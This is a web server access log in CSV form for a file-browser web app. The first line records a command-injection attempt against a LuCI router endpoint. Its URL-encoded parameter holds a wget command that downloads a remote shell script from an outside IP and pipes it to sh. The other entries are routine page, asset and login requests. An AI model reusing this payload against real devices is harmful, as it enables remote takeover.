ip,time,method,url,status,size,referrer,user_agent
45.156.87.165,20/Aug/2025:04:31:45 +0000,GET,/cgi-bin/luci/er/vlanTag?vlan_tag=%27%60wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.hqf.sh%7Csh%60%27,404,162,-,Mozilla/5.0 (bang2012@protonmail.com)
27.34.66.95,20/Aug/2025:04:40:57 +0000,GET,/browser/,200,601,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
27.34.66.95,20/Aug/2025:04:40:57 +0000,GET,/styles/root-styles.css,200,336,https://nninesolution.ddns.net/browser/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
27.34.66.95,20/Aug/2025:04:40:58 +0000,GET,/static/css/main.e60e4760.css,200,1427,https://nninesolution.ddns.net/browser/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
27.34.66.95,20/Aug/2025:04:40:58 +0000,GET,/images/background.svg,200,586,https://nninesolution.ddns.net/browser/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
27.34.66.95,20/Aug/2025:04:40:58 +0000,GET,/Loader.svg,200,18052,https://nninesolution.ddns.net/browser/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
27.34.66.95,20/Aug/2025:04:40:59 +0000,GET,/static/js/main.66e95f79.js,200,2404787,https://nninesolution.ddns.net/browser/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
27.34.66.95,20/Aug/2025:04:40:59 +0000,GET,/images/background-wave-orig2.svg,200,663820,https://nninesolution.ddns.net/browser/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
27.34.66.95,20/Aug/2025:04:41:00 +0000,GET,/api/v1/session,403,65,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
27.34.66.95,20/Aug/2025:04:41:00 +0000,GET,/favicon-32x32.png,200,16066,https://nninesolution.ddns.net/browser/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
27.34.66.95,20/Aug/2025:04:41:00 +0000,GET,/api/v1/login,200,67,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
